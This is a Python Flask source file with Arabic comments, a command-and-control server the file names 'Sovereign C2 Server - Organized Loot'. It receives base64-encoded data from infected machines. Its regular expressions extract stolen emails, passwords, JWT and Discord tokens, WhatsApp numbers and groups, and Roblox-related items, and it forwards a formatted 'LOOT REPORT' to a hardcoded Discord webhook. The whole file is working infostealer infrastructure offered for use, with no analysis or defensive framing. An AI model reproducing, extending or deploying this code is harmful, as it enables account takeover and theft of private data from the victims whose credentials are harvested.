# server.py - سيرفر وسيط متطور مع ترتيب البيانات
# تشغيل: python server.py

from flask import Flask, request, jsonify
import requests
import os
import json
import re
from datetime import datetime
from collections import Counter
import base64

app = Flask(__name__)

# =====================================================================
# إعدادات Discord - ضع رابط الويب هوك الخاص بك هنا
# =====================================================================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1475936688009252866/Ytum84whqesL_CHXK0raRgQQlDtahbLwvCsvQncGOYHqiWCCSEoaZEk9HHvM9W767bA4"

# =====================================================================
# كلاس ترتيب البيانات (Loot Organizer)
# =====================================================================
class LootOrganizer:
    def __init__(self, loot_text, client_id=""):
        self.raw_loot = loot_text
        self.client_id = client_id
        self.emails = []
        self.tokens = {'jwt': [], 'discord': []}
        self.whatsapp_numbers = {'true': [], 'false': []}
        self.whatsapp_groups = []
        self.passwords = []
        self.ids = []
        self.urls = []
        self.robux_related = []
        
    def extract_all(self):
        """استخراج كل أنواع البيانات"""
        
        # 1. الإيميلات
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        self.emails = re.findall(email_pattern, self.raw_loot)
        
        # 2. توكنات JWT (تبدأ بـ eyJ)
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        self.tokens['jwt'] = re.findall(jwt_pattern, self.raw_loot)
        
        # 3. توكنات Discord
        discord_pattern = r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}'
        self.tokens['discord'] = re.findall(discord_pattern, self.raw_loot)
        
        # 4. أرقام واتساب
        whatsapp_pattern = r'(true|false)_(\d+@c\.us)'
        for match in re.finditer(whatsapp_pattern, self.raw_loot):
            status, number = match.groups()
            self.whatsapp_numbers[status].append(number)
        
        # 5. أرقام واتساب عادية (بدون true/false)
        normal_whatsapp = r'(?<![a-zA-Z_])(\d{9,15}@c\.us)(?![a-zA-Z_])'
        for match in re.finditer(normal_whatsapp, self.raw_loot):
            num = match.group(1)
            if num not in self.whatsapp_numbers['true'] and num not in self.whatsapp_numbers['false']:
                self.whatsapp_numbers['false'].append(num)
        
        # 6. مجموعات واتساب
        group_pattern = r'\d+@g\.us'
        self.whatsapp_groups = re.findall(group_pattern, self.raw_loot)
        
        # 7. كلمات سر (أي شي مع password)
        password_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.\w+:?(?:password|passwd|https?)?:?\w*'
        self.passwords = re.findall(password_pattern, self.raw_loot)
        
        # 8. روابط
        url_pattern = r'https?://[^\s<>"]+|www\.[^\s<>"]+'
        self.urls = re.findall(url_pattern, self.raw_loot)
        
        # 9. IDs رقمية طويلة
        id_pattern = r'-?\d{15,}'
        self.ids = re.findall(id_pattern, self.raw_loot)
        
        # 10. أشياء متعلقة بـ Roblox/Robux
        robux_pattern = r'roblox|robux|rbx|RBLX|platoboost|arkoselabs'
        matches = re.finditer(robux_pattern, self.raw_loot, re.IGNORECASE)
        for match in matches:
            context = self.raw_loot[max(0, match.start()-30):min(len(self.raw_loot), match.end()+30)]
            self.robux_related.append(context.strip())
    
    def count_frequencies(self):
        """حساب تكرار كل عنصر"""
        return {
            'emails': len(set(self.emails)),
            'total_emails': len(self.emails),
            'jwt_tokens': len(self.tokens['jwt']),
            'discord_tokens': len(self.tokens['discord']),
            'whatsapp_true': len(self.whatsapp_numbers['true']),
            'whatsapp_false': len(self.whatsapp_numbers['false']),
            'whatsapp_groups': len(self.whatsapp_groups),
            'urls': len(self.urls),
            'ids': len(self.ids),
            'passwords': len(self.passwords)
        }
    
    def generate_report(self):
        """توليد تقرير مرتب"""
        
        stats = self.count_frequencies()
        
        report = []
        report.append("=" * 60)
        report.append(f"📊 **LOOT REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**")
        report.append(f"🖥️ **Client:** {self.client_id}")
        report.append("=" * 60)
        
        # 1. توكنات JWT (الأخطر)
        if self.tokens['jwt']:
            report.append("\n👑 **1. JWT TOKENS (يمكن الدخول مباشرة)**")
            report.append("```")
            for i, token in enumerate(self.tokens['jwt'][:5], 1):  # أول 5 بس عشان ما يطولش
                report.append(f"{i}. {token[:80]}...")
            if len(self.tokens['jwt']) > 5:
                report.append(f"...و {len(self.tokens['jwt'])-5} توكنات أخرى")
            report.append("```")
        
        # 2. توكنات Discord
        if self.tokens['discord']:
            report.append("\n💬 **2. DISCORD TOKENS**")
            report.append("```")
            for i, token in enumerate(self.tokens['discord'][:5], 1):
                report.append(f"{i}. {token}")
            if len(self.tokens['discord']) > 5:
                report.append(f"...و {len(self.tokens['discord'])-5} توكنات أخرى")
            report.append("```")
        
        # 3. الإيميلات مع التكرار
        if self.emails:
            report.append("\n📧 **3. EMAILS (مرتبة حسب الأكثر ظهوراً)**")
            report.append("```")
            email_counter = Counter(self.emails)
            for email, count in email_counter.most_common(10):
                report.append(f"{email} → {count} مرة")
            if len(email_counter) > 10:
                report.append(f"...و {len(email_counter)-10} إيميلات أخرى")
            report.append("```")
        
        # 4. أرقام واتساب مفعلة
        if self.whatsapp_numbers['true']:
            report.append("\n✅ **4. WHATSAPP NUMBERS - مفعلة**")
            report.append("```")
            for num in sorted(set(self.whatsapp_numbers['true']))[:10]:
                report.append(f"true_{num}")
            if len(set(self.whatsapp_numbers['true'])) > 10:
                report.append(f"...و {len(set(self.whatsapp_numbers['true']))-10} أرقام أخرى")
            report.append("```")
        
        # 5. أرقام واتساب غير مفعلة
        if self.whatsapp_numbers['false']:
            report.append("\n❌ **5. WHATSAPP NUMBERS - غير مفعلة**")
            report.append("```")
            for num in sorted(set(self.whatsapp_numbers['false']))[:10]:
                report.append(f"false_{num}")
            if len(set(self.whatsapp_numbers['false'])) > 10:
                report.append(f"...و {len(set(self.whatsapp_numbers['false']))-10} أرقام أخرى")
            report.append("```")
        
        # 6. مجموعات واتساب
        if self.whatsapp_groups:
            report.append("\n👥 **6. WHATSAPP GROUPS**")
            report.append("```")
            for group in sorted(set(self.whatsapp_groups))[:10]:
                report.append(group)
            if len(set(self.whatsapp_groups)) > 10:
                report.append(f"...و {len(set(self.whatsapp_groups))-10} مجموعات أخرى")
            report.append("```")
        
        # 7. أشياء متعلقة بـ Roblox
        if self.robux_related:
            report.append("\n🎮 **7. ROBLOX / ROBUX RELATED**")
            report.append("```")
            for item in self.robux_related[:5]:
                report.append(item)
            report.append("```")
        
        # 8. كلمات سر
        if self.passwords:
            report.append("\n🔑 **8. PASSWORDS (محفوظة)**")
            report.append("```")
            for pwd in set(self.passwords)[:10]:
                report.append(pwd)
            report.append("```")
        
        # 9. روابط مهمة
        if self.urls:
            report.append("\n🔗 **9. IMPORTANT URLs**")
            report.append("```")
            for url in set(self.urls)[:10]:
                report.append(url)
            report.append("```")
        
        # 10. إحصائيات
        report.append("\n" + "=" * 60)
        report.append("📈 **STATISTICS**")
        report.append("=" * 60)
        report.append(f"```")
        report.append(f"إجمالي الإيميلات: {stats['emails']} (إجمالي الظهور: {stats['total_emails']})")
        report.append(f"توكنات JWT: {stats['jwt_tokens']}")
        report.append(f"توكنات Discord: {stats['discord_tokens']}")
        report.append(f"أرقام واتساب مفعلة: {stats['whatsapp_true']}")
        report.append(f"أرقام واتساب غير مفعلة: {stats['whatsapp_false']}")
        report.append(f"مجموعات واتساب: {stats['whatsapp_groups']}")
        report.append(f"كلمات سر: {stats['passwords']}")
        report.append(f"روابط: {stats['urls']}")
        report.append(f"معرفات: {stats['ids']}")
        report.append(f"```")
        report.append("=" * 60)
        
        return "\n".join(report)

# =====================================================================
# سجل بسيط للعرض
# =====================================================================
def log(message):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")

# =====================================================================
# إرسال إلى Discord مع تقسيم الرسائل الطويلة
# =====================================================================
def send_to_discord(content, username="Sovereign C2"):
    try:
        # Discord حد الرسالة 2000 حرف
        if len(content) <= 1900:
            data = {
                "content": content,
                "username": username
            }
            response = requests.post(DISCORD_WEBHOOK, json=data)
            if response.status_code == 204 or response.status_code == 200:
                log(f"✅ تم الإرسال إلى Discord")
                return True
        else:
            # تقسيم الرسالة
            chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
            for i, chunk in enumerate(chunks):
                data = {
                    "content": f"**جزء {i+1}/{len(chunks)}**\n{chunk}",
                    "username": username
                }
                response = requests.post(DISCORD_WEBHOOK, json=data)
                if response.status_code != 204 and response.status_code != 200:
                    log(f"❌ فشل الجزء {i+1}")
                    return False
            log(f"✅ تم الإرسال إلى Discord ({len(chunks)} أجزاء)")
            return True
    except Exception as e:
        log(f"❌ خطأ في الإرسال: {e}")
        return False

# =====================================================================
# فك تشفير Base64
# =====================================================================
def decode_base64(data):
    try:
        decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
        return decoded
    except:
        return data

# =====================================================================
# نقطة النهاية الرئيسية - يستقبل من العميل
# =====================================================================
@app.route('/api/data', methods=['POST'])
def receive_data():
    try:
        # استقبال البيانات
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No data"}), 400
        
        # استخراج المعلومات
        client_id = data.get('id', 'unknown')
        client_id = data.get('computer', client_id)  # ممكن يكون computer بدل id
        encoded_content = data.get('content', data.get('data', 'No content'))
        timestamp = data.get('timestamp', datetime.now().isoformat())
        
        log(f"📥 استقبال من {client_id}")
        
        # فك تشفير Base64
        raw_data = decode_base64(encoded_content)
        
        # ترتيب البيانات
        organizer = LootOrganizer(raw_data, client_id)
        organizer.extract_all()
        report = organizer.generate_report()
        
        # إرسال التقرير لـ Discord
        send_to_discord(report, username=f"Sovereign - {client_id[:10]}")
        
        # حفظ نسخة محلية (اختياري)
        # filename = f"loot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        # with open(filename, 'w', encoding='utf-8') as f:
        #     f.write(report)
        # log(f"💾 تم حفظ نسخة محلية: {filename}")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        log(f"❌ خطأ: {e}")
        return jsonify({"error": str(e)}), 500

# =====================================================================
# نقطة نهاية لاستقبال بيانات غير مشفرة (للاختبار)
# =====================================================================
@app.route('/api/raw', methods=['POST'])
def receive_raw():
    try:
        data = request.get_data(as_text=True)
        client_id = request.headers.get('X-Client-ID', 'unknown')
        
        log(f"📥 استقبال بيانات خام من {client_id}")
        
        # ترتيب البيانات
        organizer = LootOrganizer(data, client_id)
        organizer.extract_all()
        report = organizer.generate_report()
        
        # إرسال لـ Discord
        send_to_discord(report, username=f"Sovereign RAW - {client_id[:10]}")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        log(f"❌ خطأ: {e}")
        return jsonify({"error": str(e)}), 500

# =====================================================================
# صفحة رئيسية للتأكد من أن السيرفر يعمل
# =====================================================================
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "server": "Sovereign C2 Server - Organized Loot",
        "version": "2.0",
        "time": datetime.now().isoformat(),
        "endpoints": {
            "/api/data (POST)": "main endpoint with base64 encoded data",
            "/api/raw (POST)": "raw data endpoint for testing",
            "/ (GET)": "this page"
        }
    })

# =====================================================================
# نقطة نهاية لعرض الإحصائيات (اختياري)
# =====================================================================
@app.route('/stats', methods=['GET'])
def stats():
    return jsonify({
        "message": "هذه نسخة مبسطة. للاحصائيات المتقدمة، استخدم قاعدة بيانات",
        "note": "هذا السيرفر لا يحفظ البيانات - فقط يعيد توجيهها لـ Discord"
    })

# =====================================================================
# تشغيل السيرفر
# =====================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print("\n" + "="*60)
    print("🚀 **SOVEREIGN C2 SERVER - ORGANIZED LOOT**")
    print("="*60)
    log(f"🚀 تشغيل السيرفر على المنفذ {port}")
    log(f"📡 Discord Webhook: {DISCORD_WEBHOOK[:50]}...")
    log(f"📍 نقطة النهاية الرئيسية: http://localhost:{port}/api/data")
    log(f"📍 نقطة نهاية الاختبار: http://localhost:{port}/api/raw")
    print("="*60 + "\n")
    
    app.run(host='0.0.0.0', port=port, debug=True)
